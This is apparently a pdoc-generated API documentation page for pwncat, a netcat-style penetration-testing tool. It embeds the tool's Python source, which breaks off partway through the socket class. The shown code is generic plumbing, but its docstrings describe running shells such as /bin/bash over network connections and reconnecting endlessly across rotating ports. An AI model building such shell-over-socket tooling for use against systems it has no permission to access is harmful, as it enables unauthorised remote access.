<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
<meta name="generator" content="pdoc 0.8.1" />
<title>pwncat API documentation</title>
<meta name="description" content="pwncat." />
<link href='https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.0/normalize.min.css' rel='stylesheet'>
<link href='https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/8.0.0/sanitize.min.css' rel='stylesheet'>
<link href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css" rel="stylesheet">
<style>.flex{display:flex !important}body{line-height:1.5em}#content{padding:20px}#sidebar{padding:30px;overflow:hidden}#sidebar > *:last-child{margin-bottom:2cm}.http-server-breadcrumbs{font-size:130%;margin:0 0 15px 0}#footer{font-size:.75em;padding:5px 30px;border-top:1px solid #ddd;text-align:right}#footer p{margin:0 0 0 1em;display:inline-block}#footer p:last-child{margin-right:30px}h1,h2,h3,h4,h5{font-weight:300}h1{font-size:2.5em;line-height:1.1em}h2{font-size:1.75em;margin:1em 0 .50em 0}h3{font-size:1.4em;margin:25px 0 10px 0}h4{margin:0;font-size:105%}a{color:#058;text-decoration:none;transition:color .3s ease-in-out}a:hover{color:#e82}.title code{font-weight:bold}h2[id^="header-"]{margin-top:2em}.ident{color:#900}pre code{background:#f8f8f8;font-size:.8em;line-height:1.4em}code{background:#f2f2f1;padding:1px 4px;overflow-wrap:break-word}h1 code{background:transparent}pre{background:#f8f8f8;border:0;border-top:1px solid #ccc;border-bottom:1px solid #ccc;margin:1em 0;padding:1ex}#http-server-module-list{display:flex;flex-flow:column}#http-server-module-list div{display:flex}#http-server-module-list dt{min-width:10%}#http-server-module-list p{margin-top:0}.toc ul,#index{list-style-type:none;margin:0;padding:0}#index code{background:transparent}#index h3{border-bottom:1px solid #ddd}#index ul{padding:0}#index h4{margin-top:.6em;font-weight:bold}@media (min-width:200ex){#index .two-column{column-count:2}}@media (min-width:300ex){#index .two-column{column-count:3}}dl{margin-bottom:2em}dl dl:last-child{margin-bottom:4em}dd{margin:0 0 1em 3em}#header-classes + dl > dd{margin-bottom:3em}dd dd{margin-left:2em}dd p{margin:10px 0}.name{background:#eee;font-weight:bold;font-size:.85em;padding:5px 10px;display:inline-block;min-width:40%}.name:hover{background:#e0e0e0}.name > span:first-child{white-space:nowrap}.name.class > span:nth-child(2){margin-left:.4em}.inherited{color:#999;border-left:5px solid #eee;padding-left:1em}.inheritance em{font-style:normal;font-weight:bold}.desc h2{font-weight:400;font-size:1.25em}.desc h3{font-size:1em}.desc dt code{background:inherit}.source summary,.git-link-div{color:#666;text-align:right;font-weight:400;font-size:.8em;text-transform:uppercase}.source summary > *{white-space:nowrap;cursor:pointer}.git-link{color:inherit;margin-left:1em}.source pre{max-height:500px;overflow:auto;margin:0}.source pre code{font-size:12px;overflow:visible}.hlist{list-style:none}.hlist li{display:inline}.hlist li:after{content:',\2002'}.hlist li:last-child:after{content:none}.hlist .hlist{display:inline;padding-left:1em}img{max-width:100%}.admonition{padding:.1em .5em;margin-bottom:1em}.admonition-title{font-weight:bold}.admonition.note,.admonition.info,.admonition.important{background:#aef}.admonition.todo,.admonition.versionadded,.admonition.tip,.admonition.hint{background:#dfd}.admonition.warning,.admonition.versionchanged,.admonition.deprecated{background:#fd4}.admonition.error,.admonition.danger,.admonition.caution{background:lightpink}</style>
<style media="screen and (min-width: 700px)">@media screen and (min-width:700px){#sidebar{width:30%;height:100vh;overflow:auto;position:sticky;top:0}#content{width:70%;max-width:100ch;padding:3em 4em;border-left:1px solid #ddd}pre code{font-size:1em}.item .name{font-size:1em}main{display:flex;flex-direction:row-reverse;justify-content:flex-end}.toc ul ul,#index ul{padding-left:1.5em}.toc > ul > li{margin-top:.5em}}</style>
<style media="print">@media print{#sidebar h1{page-break-before:always}.source{display:none}}@media print{*{background:transparent !important;color:#000 !important;box-shadow:none !important;text-shadow:none !important}a[href]:after{content:" (" attr(href) ")";font-size:90%}a[href][title]:after{content:none}abbr[title]:after{content:" (" attr(title) ")"}.ir a:after,a[href^="javascript:"]:after,a[href^="#"]:after{content:""}pre,blockquote{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}tr,img{page-break-inside:avoid}img{max-width:100% !important}@page{margin:0.5cm}p,h2,h3{orphans:3;widows:3}h1,h2,h3,h4,h5,h6{page-break-after:avoid}}</style>
</head>
<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>pwncat</code></h1>
</header>
<section id="section-intro">
<p>pwncat.</p>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">#!/usr/bin/env python3
&#34;&#34;&#34;pwncat.&#34;&#34;&#34;

# Main sections in this file:
# ------------------------------------
#  1. Data structure types
#  2. Library classes
#  3. Network
#  4. Transformer
#  5. IO modules
#  6. PSE Store
#  7. IO Runner
#  8. Command &amp; Control
#  9. Command line arguments
# 10. Main entrypoint
#
# How does it work?
# ------------------------------------
# 1. IO (Various input/output modules based on producer/consumer)
# 2. Transformer (transforms data)
# 3. Runner (puts IO consumer/producer into threads)
# 4. Signaling / Interrupts
#
# 1. IO
# ------------------------------------
# IO classes provide basic input/output functionality.
# The producer will constantly gather input (net recv, user input, command output)
# The consumer is a callback applied to this data (net send, output, command execution)
# Each producer/consumer pair will be put into a thread by the Runner instance.
#
# 2. Transformer
# ---------------------------
# Transformer sit on top of a IO callback and can transform the data before it is send
# to the callback. (e.g.: convert LF to CRLF, convert simple text into a HTTP POST request,
# convert a HTTP POST response into text, encrypt/decrypt, etc.)
#
# 3. Runner - The really cool meat:
# ------------------------------------
# The single Runner instance puts it all-together. Each producer/consumer pair (and
# x many Transformer) will be moved into their own Thread.
# Producer and consumer of different instances can be mixed, when adding them to the Runner.
# This allows an Net-1.receive producer, to output it (chat), execute it (command)
# or to send it further via a second Net-2 class (proxy).
#
# A list of Transformer can be added to each consumer/producer pair, allowing further data
# transformation. This means you can simply write a Transformer, which wraps any kind of raw
# data into a Layer-7 protocol and/or unwraps it from it. This allows for easy extension
# of various protocols or other data transformations.
#
# 4. Signaling / Interrupts
# ------------------------------------
# The StopSignal instance is distributed across all Threads and and the Runner instance and
# is a way to let other Threads know that a stop signal has been requested.
# Producer/Consumer can implement their own interrupt function so they can be stopped from
# inside (if they do non-blocking stuff) or from outside (if they do blocking stuff).

from __future__ import print_function
from abc import abstractmethod
from abc import ABCMeta

from subprocess import PIPE
from subprocess import Popen
from subprocess import STDOUT

import argparse
import atexit
import base64
import logging
import os
import re
import socket
import sys
import threading
import time

# Abstract class with Python 2 + Python 3 support: https://stackoverflow.com/questions/35673474
ABC = ABCMeta(&#34;ABC&#34;, (object,), {&#34;__slots__&#34;: ()})

# Only used with mypy for static source code analysis
if os.environ.get(&#34;MYPY_CHECK&#34;, False):
    from typing import Optional, Iterator, List, Dict, Any, Callable, Tuple, Union
    from types import CodeType

# TODO: Find windows import
if os.name != &#34;nt&#34;:
    import select

# -------------------------------------------------------------------------------------------------
# GLOBALS
# -------------------------------------------------------------------------------------------------

APPNAME = &#34;pwncat&#34;
APPREPO = &#34;https://github.com/cytopia/pwncat&#34;
VERSION = &#34;0.0.18-alpha&#34;

# Default timeout for timeout-based sys.stdin and socket.recv
TIMEOUT_READ_STDIN = 0.1
TIMEOUT_RECV_SOCKET = 0.1
TIMEOUT_RECV_SOCKET_RETRY = 2

# https://docs.python.org/3/library/subprocess.html#popen-constructor
# * 0 means unbuffered (read and write are one system call and can return short)
# * 1 means line buffered (only usable if universal_newlines=True i.e., in a text mode)
# * any other positive value means use a buffer of approximately that size
# * negative bufsize (the default) means the system default of io.DEFAULT_BUFFER_SIZE will be used.
# TODO: should I use &#39;bufsize=1&#39;?
POPEN_BUFSIZE = -1

# https://docs.python.org/3/library/socket.html#socket.socket.recv
RECV_BUFSIZE = 8192

# https://docs.python.org/3/library/socket.html#socket.socket.listen
LISTEN_BACKLOG = 0


# #################################################################################################
# #################################################################################################
# ###
# ###   1 / 10   D A T A   S T R U C T U R E   T Y P E S
# ###
# #################################################################################################
# #################################################################################################

# -------------------------------------------------------------------------------------------------
# [1/10 DATA STRUCTURE TYPES]: (1/9) DsRunnerAction
# -------------------------------------------------------------------------------------------------
class DsRunnerAction(object):
    &#34;&#34;&#34;A type-safe data structure for Action functions for the Runner class.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def producer(self):
        # type: () -&gt; Callable[[], Iterator[str]]
        &#34;&#34;&#34;`IO.producer`: Data producer function.&#34;&#34;&#34;
        return self.__producer

    @property
    def consumer(self):
        # type: () -&gt; Callable[[str], None]
        &#34;&#34;&#34;`IO.consumer`: Data consumer function.&#34;&#34;&#34;
        return self.__consumer

    @property
    def interrupts(self):
        # type: () -&gt; List[Callable[[], None]]
        &#34;&#34;&#34;`[List[Callable[[], None]]]`: List of interrupt functions for the producer/consumer.&#34;&#34;&#34;
        return self.__interrupts

    @property
    def transformers(self):
        # type: () -&gt; List[Transform]
        &#34;&#34;&#34;`[Transform.transformer]`: List of transformer functions applied before consumer.&#34;&#34;&#34;
        return self.__transformers

    @property
    def code(self):
        # type: () -&gt; Optional[Union[str, bytes, CodeType]]
        &#34;&#34;&#34;`ast.AST`: custom Python code which provides a `transform(data, pse) -&gt; str` function.&#34;&#34;&#34;
        return self.__code

    # --------------------------------------------------------------------------
    # Contrcutor
    # --------------------------------------------------------------------------
    def __init__(
        self,
        producer,  # type: Callable[[], Iterator[str]]
        consumer,  # type: Callable[[str], None]
        interrupts,  # type: List[Callable[[], None]]
        transformers,  # type: List[Transform]
        code,  # type: Optional[Union[str, bytes, CodeType]]
    ):
        # type: (...) -&gt; None
        self.__producer = producer
        self.__consumer = consumer
        self.__interrupts = interrupts
        self.__transformers = transformers
        self.__code = code


# -------------------------------------------------------------------------------------------------
# [1/10 DATA STRUCTURE TYPES]: (2/9) DsRunnerTimer
# -------------------------------------------------------------------------------------------------
class DsRunnerTimer(object):
    &#34;&#34;&#34;A type-safe data structure for Timer functions for the Runner class.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def action(self):
        # type: () -&gt; Callable[..., None]
        &#34;&#34;&#34;`Callable[..., None]`: function to be run periodically.&#34;&#34;&#34;
        return self.__action

    @property
    def intvl(self):
        # type: () -&gt; int
        &#34;&#34;&#34;`int`: interval at which to run the action function..&#34;&#34;&#34;
        return self.__intvl

    @property
    def args(self):
        # type: () -&gt; Tuple[Any, ...]
        &#34;&#34;&#34;`*args`: optional *args for the action function.&#34;&#34;&#34;
        return self.__args

    @property
    def kwargs(self):
        # type: () -&gt; Dict[str, Any]
        &#34;&#34;&#34;`**kargs`: optional *kwargs for the action function.&#34;&#34;&#34;
        return self.__kwargs

    @property
    def signal(self):
        # type: () -&gt; StopSignal
        &#34;&#34;&#34;`StopSignal`: StopSignal instance.&#34;&#34;&#34;
        return self.__signal

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(
        self,
        action,  # type: Callable[..., None]
        signal,  # type: StopSignal
        intvl,  # type: int
        *args,  # type: Tuple[Any, ...]
        **kwargs  # type: Dict[str, Any]
    ):
        # type: (...) -&gt; None
        assert type(intvl) is int, type(intvl)
        assert type(kwargs) is dict, type(kwargs)
        self.__action = action
        self.__signal = signal
        self.__intvl = intvl
        self.__args = args
        self.__kwargs = kwargs


# -------------------------------------------------------------------------------------------------
# [1/10 DATA STRUCTURE TYPES]: (3/9) DsSock
# -------------------------------------------------------------------------------------------------
class DsSock(object):
    &#34;&#34;&#34;A type-safe data structure for DsSock options.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def bufsize(self):
        # type: () -&gt; int
        &#34;&#34;&#34;`int`: Receive buffer size.&#34;&#34;&#34;
        return self.__bufsize

    @property
    def backlog(self):
        # type: () -&gt; int
        &#34;&#34;&#34;`int`: Listen backlog.&#34;&#34;&#34;
        return self.__backlog

    @property
    def recv_timeout(self):
        # type: () -&gt; Optional[float]
        &#34;&#34;&#34;`float` or `None`: Receive timeout to change blocking socket to time-out based.&#34;&#34;&#34;
        return self.__recv_timeout

    @property
    def nodns(self):
        # type: () -&gt; bool
        &#34;&#34;&#34;`bool`: Determines if we resolve hostnames or not.&#34;&#34;&#34;
        return self.__nodns

    @property
    def ipv6(self):
        # type: () -&gt; bool
        &#34;&#34;&#34;`bool`: Determines if we use IPv6 instead of IPv4.&#34;&#34;&#34;
        return self.__ipv6

    @property
    def udp(self):
        # type: () -&gt; bool
        &#34;&#34;&#34;`bool`: Determines if we use TCP or UDP.&#34;&#34;&#34;
        return self.__udp

    @property
    def ip_tos(self):
        # type: () -&gt; Optional[str]
        &#34;&#34;&#34;`str`: Determines what IP_TOS (Type of Service) value to set for the socket.&#34;&#34;&#34;
        return self.__ip_tos

    @property
    def info(self):
        # type: () -&gt; str
        &#34;&#34;&#34;`str`: Determines what info to display about the socket connection.&#34;&#34;&#34;
        return self.__info

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, bufsize, backlog, recv_timeout, nodns, ipv6, udp, ip_tos, info):
        # type: (int, int, Optional[float], bool, bool, bool, Optional[str], str) -&gt; None
        assert type(bufsize) is int, type(bufsize)
        assert type(backlog) is int, type(backlog)
        assert type(recv_timeout) is float, type(recv_timeout)
        assert type(nodns) is bool, type(nodns)
        assert type(ipv6) is bool, type(ipv6)
        assert type(udp) is bool, type(udp)
        assert type(info) is str, type(info)
        self.__bufsize = bufsize
        self.__backlog = backlog
        self.__recv_timeout = recv_timeout
        self.__nodns = nodns
        self.__ipv6 = ipv6
        self.__udp = udp
        self.__ip_tos = ip_tos
        self.__info = info


# -------------------------------------------------------------------------------------------------
# [1/10 DATA STRUCTURE TYPES]: (4/9) DsIONetworkSock
# -------------------------------------------------------------------------------------------------
class DsIONetworkSock(DsSock):
    &#34;&#34;&#34;A type-safe data structure for IONetwork socket options.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def recv_timeout_retry(self):
        # type: () -&gt; int
        &#34;&#34;&#34;`int`: How many times to retry receiving if stop signal was raised.&#34;&#34;&#34;
        return self.__recv_timeout_retry

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(
        self,
        bufsize,  # type: int
        backlog,  # type: int
        recv_timeout,  # type: Optional[float]
        recv_timeout_retry,  # type: int
        nodns,  # type: bool
        ipv6,  # type: bool
        udp,  # type: bool
        ip_tos,  # type: Optional[str]
        info,  # type: str
    ):
        # type: (...) -&gt; None
        assert type(recv_timeout_retry) is int, type(recv_timeout_retry)
        self.__recv_timeout_retry = recv_timeout_retry
        super(DsIONetworkSock, self).__init__(
            bufsize, backlog, recv_timeout, nodns, ipv6, udp, ip_tos, info
        )


# -------------------------------------------------------------------------------------------------
# [1/10 DATA STRUCTURE TYPES]: (5/9) DsIONetworkCli
# -------------------------------------------------------------------------------------------------
class DsIONetworkCli(object):
    &#34;&#34;&#34;A type-safe data structure for IONetwork client options.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def reconn(self):
        # type: () -&gt; int
        &#34;&#34;&#34;`int`: If connection fails, retry endless (if negative) or x many times.&#34;&#34;&#34;
        return self.__reconn

    @reconn.setter
    def reconn(self, value):
        # type: (int) -&gt; None
        assert type(value) is int, type(value)
        self.__reconn = value

    @property
    def reconn_wait(self):
        # type: () -&gt; float
        &#34;&#34;&#34;`float`: Wait time between re-connections in seconds.&#34;&#34;&#34;
        return self.__reconn_wait

    @reconn_wait.setter
    def reconn_wait(self, value):
        # type: (float) -&gt; None
        assert type(value) is float, type(value)
        self.__reconn_wait = value

    @property
    def reconn_robin(self):
        # type: () -&gt; List[int]
        &#34;&#34;&#34;`[int]`: List of alternating re-connection ports.&#34;&#34;&#34;
        return self.__reconn_robin

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, reconn, reconn_wait, reconn_robin):
        # type: (int, float, List[int]) -&gt; None
        assert type(reconn) is int, type(reconn)
        assert type(reconn_wait) is float, type(reconn_wait)
        assert type(reconn_robin) is list, type(reconn_robin)
        for i in reconn_robin:
            assert type(i) is int, type(i)
        self.__reconn = reconn
        self.__reconn_wait = reconn_wait
        self.__reconn_robin = reconn_robin


# -------------------------------------------------------------------------------------------------
# [1/10 DATA STRUCTURE TYPES]: (6/9) DsIONetworkSrv
# -------------------------------------------------------------------------------------------------
class DsIONetworkSrv(object):
    &#34;&#34;&#34;A type-safe data structure for IONetwork server options.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def keep_open(self):
        # type: () -&gt; bool
        &#34;&#34;&#34;`bool`: Accept new clients if one has disconnected.&#34;&#34;&#34;
        return bool(self.__keep_open)

    @keep_open.setter
    def keep_open(self, value):
        # type: (bool) -&gt; None
        &#34;&#34;&#34;Change keep_open value.&#34;&#34;&#34;
        assert type(value) is bool, type(value)
        self.__keep_open = value

    @property
    def rebind(self):
        # type: () -&gt; int
        &#34;&#34;&#34;`int`: If binding fails, retry endless (if negative) or x many times.&#34;&#34;&#34;
        return self.__rebind

    @property
    def rebind_wait(self):
        # type: () -&gt; float
        &#34;&#34;&#34;`float`: Wait time between rebinds in seconds.&#34;&#34;&#34;
        return self.__rebind_wait

    @property
    def rebind_robin(self):
        # type: () -&gt; List[int]
        &#34;&#34;&#34;`[int]`: List of alternating rebind ports.&#34;&#34;&#34;
        return self.__rebind_robin

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, keep_open, rebind, rebind_wait, rebind_robin):
        # type: (bool, int, float, List[int]) -&gt; None
        assert type(keep_open) is bool, type(keep_open)
        assert type(rebind) is int, type(rebind)
        assert type(rebind_wait) is float, type(rebind_wait)
        assert type(rebind_robin) is list, type(rebind_robin)
        for i in rebind_robin:
            assert type(i) is int, type(i)
        self.keep_open = keep_open
        self.__rebind = rebind
        self.__rebind_wait = rebind_wait
        self.__rebind_robin = rebind_robin


# -------------------------------------------------------------------------------------------------
# [1/10 DATA STRUCTURE TYPES]: (7/9) DsTransformLinefeed
# -------------------------------------------------------------------------------------------------
class DsTransformLinefeed(object):
    &#34;&#34;&#34;A type-safe data structure for DsTransformLinefeed options.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def crlf(self):
        # type: () -&gt; Optional[str]
        &#34;&#34;&#34;`bool`: Converts line endings to LF, CRLF or CR and noop on `None`.&#34;&#34;&#34;
        return self.__crlf

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, crlf):
        # type: (Optional[str]) -&gt; None
        super(DsTransformLinefeed, self).__init__()
        self.__crlf = crlf


# -------------------------------------------------------------------------------------------------
# [1/10 DATA STRUCTURE TYPES]: (8/9) DsIOStdinStdout
# -------------------------------------------------------------------------------------------------
class DsIOStdinStdout(object):
    &#34;&#34;&#34;A type-safe data structure for IOStdinStdout options.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def enc(self):
        # type: () -&gt; StringEncoder
        &#34;&#34;&#34;`StringEncoder`: String encoder instance.&#34;&#34;&#34;
        return self.__enc

    @property
    def input_timeout(self):
        # type: () -&gt; Optional[float]
        &#34;&#34;&#34;`float`: Input timeout in seconds for non-blocking read or `None` for blocking.&#34;&#34;&#34;
        return self.__input_timeout

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, encoder, input_timeout):
        # type: (StringEncoder, Optional[float]) -&gt; None
        super(DsIOStdinStdout, self).__init__()
        self.__enc = encoder
        self.__input_timeout = input_timeout


# -------------------------------------------------------------------------------------------------
# [1/10 DATA STRUCTURE TYPES]: (9/9) DsIOCommand
# -------------------------------------------------------------------------------------------------
class DsIOCommand(object):
    &#34;&#34;&#34;A type-safe data structure for IOCommand options.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def enc(self):
        # type: () -&gt; StringEncoder
        &#34;&#34;&#34;`StringEncoder`: Instance of StringEncoder.&#34;&#34;&#34;
        return self.__enc

    @property
    def executable(self):
        # type: () -&gt; str
        &#34;&#34;&#34;`srt`: Name or path of executable to run (e.g.: `/bin/bash`).&#34;&#34;&#34;
        return self.__executable

    @property
    def bufsize(self):
        # type: () -&gt; int
        &#34;&#34;&#34;`int`: `subprocess.Popen` bufsize.

        https://docs.python.org/3/library/subprocess.html#popen-constructor
        0 means unbuffered (read and write are one system call and can return short)
        1 means line buffered (only usable if universal_newlines=True i.e., in a text mode)
        any other positive value means use a buffer of approximately that size
        negative bufsize (the default) means system default of io.DEFAULT_BUFFER_SIZE will be used.
        &#34;&#34;&#34;
        return self.__bufsize

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, enc, executable, bufsize):
        # type: (StringEncoder, str, int) -&gt; None
        self.__enc = enc
        self.__executable = executable
        self.__bufsize = bufsize


# #################################################################################################
# #################################################################################################
# ###
# ###   2 / 10   L I B R A R Y   C L A S S E S
# ###
# #################################################################################################
# #################################################################################################

# -------------------------------------------------------------------------------------------------
# [2/10 LIBRARY CLASSES]: (1/4) TraceLogger
# -------------------------------------------------------------------------------------------------
class TraceLogger(logging.getLoggerClass()):  # type: ignore
    &#34;&#34;&#34;Extend Python&#39;s default logger class with TRACE level logging.&#34;&#34;&#34;

    LEVEL_NUM = 9
    LEVEL_NAME = &#34;TRACE&#34;

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, name, level=logging.NOTSET):
        # type: (str, int) -&gt; None
        &#34;&#34;&#34;Instantiate TraceLogger class.

        Args:
            name (str):  Instance name.
            level (int): Current log level.
        &#34;&#34;&#34;
        super(TraceLogger, self).__init__(name, level)
        logging.addLevelName(self.LEVEL_NUM, self.LEVEL_NAME)

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def trace(self, msg, *args, **kwargs):
        # type: (str, Any, Any) -&gt; None
        &#34;&#34;&#34;Set custom log level for TRACE.

        Args:
            msg (str): The log message.
            args (args): *args for trace level log function.
            kwargs (kwargs): kwargs for trace level log function.
        &#34;&#34;&#34;
        if self.isEnabledFor(self.LEVEL_NUM):
            # Yes, logger takes its &#39;*args&#39; as &#39;args&#39;.
            self._log(self.LEVEL_NUM, msg, args, **kwargs)


# -------------------------------------------------------------------------------------------------
# [2/10 LIBRARY CLASSES]: (2/4) ColoredLogFormatter
# -------------------------------------------------------------------------------------------------
class ColoredLogFormatter(logging.Formatter):
    &#34;&#34;&#34;Custom log formatter which adds different details and color support.&#34;&#34;&#34;

    COLORS = {
        logging.CRITICAL: &#34;\x1b[31;1m&#34;,  # bold red
        logging.ERROR: &#34;\x1b[31;21m&#34;,  # red
        logging.WARNING: &#34;\x1b[33;21m&#34;,  # yellow
        logging.INFO: &#34;\x1b[32;21m&#34;,  # green
        logging.DEBUG: &#34;\x1b[30;21m&#34;,  # gray
    }
    COLOR_DEF = COLORS[logging.DEBUG]
    COLOR_RST = &#34;\x1b[0m&#34;

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, color, loglevel):
        # type: (str, int) -&gt; None
        &#34;&#34;&#34;Instantiate ColoredLogFormatter class.

        Args:
            color (str):  Either be `alway`, `never` or `auto`.
            loglevel (int): Current desired log level.
        &#34;&#34;&#34;
        super(ColoredLogFormatter, self).__init__()
        self.color = color
        self.loglevel = loglevel
        self.tty = sys.stderr.isatty()

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def format(self, record):
        # type: (logging.LogRecord) -&gt; str
        &#34;&#34;&#34;Apply custom formatting to log message.&#34;&#34;&#34;
        log_fmt = self.__get_format()
        log_fmt = self.__colorize(record.levelno, log_fmt)
        formatter = logging.Formatter(log_fmt)
        return formatter.format(record)

    # --------------------------------------------------------------------------
    # Private Functions
    # --------------------------------------------------------------------------
    def __get_format(self):
        # type: () -&gt; str
        &#34;&#34;&#34;Return format string based on currently applied log level.&#34;&#34;&#34;
        # In debug logging we add slightly more info to all formats
        if self.loglevel == logging.DEBUG:
            return &#34;%(levelname)s [%(threadName)s]: %(message)s&#34;
        # In lower than debug logging we will add even more info to all log formats
        if self.loglevel &lt; logging.DEBUG:
            return (
                &#34;%(asctime)s %(levelname)s [%(threadName)s] %(lineno)d:%(funcName)s(): %(message)s&#34;
            )
        # By default, we will only add basic info
        return &#34;%(levelname)s: %(message)s&#34;

    def __colorize(self, level, fmt):
        # type: (int, str) -&gt; str
        &#34;&#34;&#34;Colorize a log message based on its level.&#34;&#34;&#34;
        if self.color == &#34;never&#34;:
            return fmt

        # If stderr is redirected to a file or we&#39;re running on windows, do not do colorize
        if self.color == &#34;auto&#34; and (not self.tty or os.name == &#34;nt&#34;):
            return fmt

        return self.COLORS.get(level, self.COLOR_DEF) + fmt + self.COLOR_RST


# -------------------------------------------------------------------------------------------------
# [2/10 LIBRARY CLASSES]: (3/4) StringEncoder
# -------------------------------------------------------------------------------------------------
class StringEncoder(object):
    &#34;&#34;&#34;Takes care about Python 2/3 string encoding/decoding.

    This allows to parse all string/byte values internally between all
    classes or functions as strings to keep full Python 2/3 compat.
    &#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Create a StringEncoder instance which converts str/bytes according to Python version.&#34;&#34;&#34;
        self.__py3 = sys.version_info &gt;= (3, 0)  # type: bool

        # https://stackoverflow.com/questions/606191/27527728#27527728
        self.__codec = &#34;cp437&#34;
        self.__fallback = &#34;latin-1&#34;

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def encode(self, data):
        # type: (str) -&gt; bytes
        &#34;&#34;&#34;Convert string into a byte type for Python3.&#34;&#34;&#34;
        if self.__py3:
            try:
                return data.encode(self.__codec)
            except UnicodeEncodeError:
                # TODO: Add logging
                return data.encode(self.__fallback)
        return data  # type: ignore

    def decode(self, data):
        # type: (bytes) -&gt; str
        &#34;&#34;&#34;Convert bytes into a string type for Python3.&#34;&#34;&#34;
        if self.__py3:
            return data.decode(self.__codec)
        return data  # type: ignore

    def base64_encode(self, data):
        # type: (str) -&gt; str
        &#34;&#34;&#34;Convert string into a base64 encoded string.&#34;&#34;&#34;
        return self.decode(base64.b64encode(self.encode(data)))


# -------------------------------------------------------------------------------------------------
# [2/10 LIBRARY CLASSES]: (4/4): StopSignal
# -------------------------------------------------------------------------------------------------
class StopSignal(object):
    &#34;&#34;&#34;Provide a simple boolean switch.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Create a StopSignal instance.&#34;&#34;&#34;
        self.__stop = False

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def has_stop(self):
        # type: () -&gt; bool
        &#34;&#34;&#34;Check if a stop signal has been raised.&#34;&#34;&#34;
        return self.__stop

    def raise_stop(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Raise a stop signal.&#34;&#34;&#34;
        self.__stop = True


# #################################################################################################
# #################################################################################################
# ###
# ###   3 / 10   N E T W O R K
# ###
# #################################################################################################
# #################################################################################################

# -------------------------------------------------------------------------------------------------
# [3/10 NETWORK]: (1/1) Sock
# -------------------------------------------------------------------------------------------------
class Sock(object):
    &#34;&#34;&#34;Provides an abstracted server client socket for TCP and UDP.&#34;&#34;&#34;

    __sock = None  # type: socket.socket
    __conn = None  # type: socket.socket

    # For Internet Protocol v4 the value consists of an integer, the least significant 8 bits of
    # which represent the value of the TOS octet in IP packets sent by the socket.
    # RFC 1349 defines the TOS values as follows:
    IP_TOS = {
        &#34;mincost&#34;: 0x02,
        &#34;lowcost&#34;: 0x02,
        &#34;reliability&#34;: 0x04,
        &#34;throughput&#34;: 0x08,
        &#34;lowdelay&#34;: 0x10,
    }

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(self, encoder, ssig, options):
        # type: (StringEncoder, StopSignal, DsSock) -&gt; None
        &#34;&#34;&#34;Instantiate Sock class.

        Args:
            encoder (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
            ssig (StopSignal): Used to stop blocking loops.
            options (DsSock): Instance of DsSock.
        &#34;&#34;&#34;
        self.__log = logging.getLogger(__name__)
        self.__enc = encoder
        self.__ssig = ssig
        self.__options = options

        # Store the address of the remote end.
        # If we are in server role and running in UDP mode,
        # it must wait for the client to connect first in order
        # to retrieve its addr and port be able to send data back to it.
        self.__remote_addr = None  # type: Optional[str]
        self.__remote_port = None  # type: Optional[int]

    # --------------------------------------------------------------------------
    # Public Send / Receive Functions
    # --------------------------------------------------------------------------
    def send(self, data):
        # type: (str) -&gt; int
        &#34;&#34;&#34;Send data through a connected socket.

        Args:
            data (str): The data to send.

        Returns:
            int: Returns total bytes sent.
        &#34;&#34;&#34;
        # In case of sending data back to an udp client we need to wait
        # until the client has first connected and told us its addr/port.
        if self.__options.udp:
            if self.__remote_addr is None or self.__remote_port is None:
                self.__log.warning(&#34;UDP client has not yet connected. Queueing message&#34;)
                while self.__remote_addr is None or self.__remote_port is None:
                    # In case the user pressed Ctrl+c on the server while trying
